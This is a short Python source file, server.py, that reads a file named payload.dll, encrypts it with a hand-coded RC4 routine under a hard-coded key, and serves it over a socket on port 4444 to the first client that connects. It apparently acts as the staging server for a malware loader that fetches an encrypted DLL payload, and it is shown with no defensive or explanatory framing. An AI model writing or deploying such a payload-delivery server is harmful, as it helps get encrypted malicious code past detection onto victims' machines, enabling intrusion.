# server.py

import socket
import struct

KEY = b'MySecretKey123'
HOST = '0.0.0.0'
PORT = 4444

def rc4(key, data):
    # s-box
    s = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s[i] + key[i % len(key)]) % 256
        s[i], s[j] = s[j], s[i]

    i = j = 0
    out = bytearray()
    for byte in data:
        i = (i + 1) % 256
        j = (j + s[i]) % 256
        s[i], s[j] = s[j], s[i]
        out.append(byte ^ s[(s[i] + s[j]) % 256])
    
    return bytes(out)

with open('payload.dll', 'rb') as f:
    dll = f.read()

combined = struct.pack("<I", len(dll)) + dll
encrypted = rc4(KEY, combined)

print(f'[*] payload.dll : {len(dll)} bytes')
print(f'[*] encrypted : {len(encrypted)} bytes')
print(f'[*] listening on {HOST}:{PORT}')

skt = socket.socket()
skt.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
skt.bind((HOST, PORT))
skt.listen(1)

conn, addr = skt.accept()
print(f'[+] Connection from {addr}')
conn.sendall(encrypted)
conn.close()
print(f'[+] payload sent')
